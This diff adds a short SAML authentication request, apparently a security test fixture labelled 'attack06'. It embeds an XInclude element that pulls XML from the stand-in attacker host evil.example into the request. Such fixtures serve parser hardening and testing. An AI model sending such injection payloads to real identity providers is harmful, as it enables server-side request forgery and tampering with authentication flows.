@@ -1,0 +1,4 @@
+<samlp:AuthnRequest xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" ID="_attack06" Version="2.0" IssueInstant="2024-01-01T00:00:00Z" Destination="https://idp.example.com/SAML/Redirect" AssertionConsumerServiceURL="https://sp.example.com/SAML/POST">
+  <saml:Issuer xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">https://sp.example.com/metadata</saml:Issuer>
+  <xi:include xmlns:xi="http://www.w3.org/2001/XInclude" href="http://evil.example/payload.xml" parse="xml" />
+</samlp:AuthnRequest>
